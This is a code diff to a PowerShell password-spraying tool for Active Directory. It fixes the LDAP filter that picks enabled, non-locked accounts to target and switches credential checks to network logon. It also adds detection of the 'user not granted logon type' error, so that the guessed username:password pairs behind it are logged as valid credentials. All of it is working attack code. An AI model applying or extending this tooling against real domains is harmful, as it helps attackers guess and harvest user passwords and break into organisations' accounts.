@@ -321,6 +321,7 @@ function Get-DomainUserList
     This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
 
     #>
+
     param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
@@ -431,7 +432,7 @@ function Get-DomainUserList
         # uac 0x10 is LOCKOUT
         # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
         $UserSearcher.filter =
-            "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
+            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
     }
     else
     {
@@ -523,7 +524,7 @@ function Test-KerberosCredential {
     )
 
     $tokenHandle = [IntPtr]::Zero
-    $LogonType = 2        # Interactive
+    $LogonType = 3        # Network
     $LogonProvider = 2    # Use default (Kerberos if joined to domain)
 
     $success = [LogonUtil]::LogonUser($Username, $Domain, $Password, $LogonType, $LogonProvider, [ref]$tokenHandle)
@@ -544,6 +545,7 @@ function Test-KerberosCredential {
             1328 { "INVALID LOGON HOURS" }
             1329 { "INVALID WORKSTATION" }
             1330 { "PASSWORD EXPIRED"}
+            1385 { "USER NOT GRANTED LOGON TYPE" }
             1907 { "PASSWORD MUST CHANGE" }
             1909 { "ACCOUNT LOCKED" }
             default { "ERROR $errorCode" }
@@ -633,6 +635,13 @@ function Invoke-SpraySinglePassword
                     }
                 }
 
+                "USER NOT GRANTED LOGON TYPE" {
+                    Write-Host -ForegroundColor Cyan "[!] USER NOT GRANTED LOGON TYPE: $($result.Domain)\$($result.Username):$($result.Password)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # USER NOT GRANTED LOGON TYPE"
+                    }
+                }
+
                 "INVALID WORKSTATION" {
                     Write-Host -ForegroundColor Cyan "[!] INVALID WORKSTATION: $($result.Domain)\$($result.Username):$($result.Password)"
                     if ($OutFile -ne "") {
@@ -646,7 +655,7 @@ function Invoke-SpraySinglePassword
                         Add-Content $OutFile "$($result.Username):$($result.Password) # ACCOUNT LOCKED"
                     }
                 }
-
+                
                 default {
                     if (-not $Quiet) {
                         Write-Host "[-] $($result.Status): $($result.Domain)\$($result.Username)"
